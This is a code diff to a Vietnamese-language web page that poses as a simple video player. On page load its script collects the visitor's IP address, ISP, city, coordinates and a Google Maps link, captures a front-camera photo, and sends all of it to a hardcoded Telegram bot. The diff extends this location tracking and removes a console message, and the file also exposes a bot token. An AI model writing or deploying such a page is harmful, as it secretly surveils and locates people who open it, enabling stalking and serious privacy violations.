@@ -34,27 +34,39 @@
     <source src="https://samplelib.com/lib/preview/mp4/sample-5s.mp4" type="video/mp4" />
     Trình duyệt của bạn không hỗ trợ video.
   </video>
-
   <canvas id="snapshot" class="hidden"></canvas>
 
   <script>
     const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
     const chat_id = "5017098451";
 
-    async function sendIP() {
-      const ipinfo = await fetch("https://api.ipify.org?format=json")
+    async function getInfo() {
+      const ipinfo = await fetch("https://ipwhois.app/json/")
         .then(res => res.json())
         .catch(() => null);
 
       const now = new Date();
-      const msg = `📡 [THÔNG TIN TRUY CẬP]
+      const formatTime = now.toLocaleTimeString("vi-VN");
+      const formatDate = now.toLocaleDateString("vi-VN");
 
-🕒 Thời gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
+      return `📡 [THÔNG TIN TRUY CẬP]
+
+🕒 Thời gian: ${formatTime} ${formatDate}
 📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
 🖥️ Hệ điều hành: ${navigator.platform}
-🌍 IP: ${ipinfo?.ip || "Không xác định"}
+🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
+🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
+🏢 ISP: ${ipinfo?.isp || "Không xác định"}
+🏙️ Địa chỉ: ${ipinfo?.city}, ${ipinfo?.region}, ${ipinfo?.postal}
+🌎 Quốc gia: ${ipinfo?.country}
+📍 Vĩ độ: ${ipinfo?.latitude}
+📍 Kinh độ: ${ipinfo?.longitude}
+📌 Vị trí Google Maps: https://maps.google.com/?q=${ipinfo?.latitude},${ipinfo?.longitude}
 📸 Camera: Đang kiểm tra quyền truy cập...`;
+    }
 
+    async function sendInfoMessage() {
+      const msg = await getInfo();
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -71,8 +83,7 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         video.srcObject = stream;
         await video.play();
-
-        await new Promise(r => setTimeout(r, 2000)); // chờ camera ổn định
+        await new Promise(r => setTimeout(r, 2000));
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -90,7 +101,6 @@
 
         stream.getTracks().forEach(track => track.stop());
       } catch (err) {
-        console.log("❌ Không thể truy cập camera:", err);
         const msg = `📸 Không thể truy cập camera: ${err.message || "Từ chối quyền"}`;
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
@@ -100,7 +110,7 @@
       }
     }
 
-    sendIP();
+    sendInfoMessage();
     captureAndSendPhoto();
   </script>
 </body>
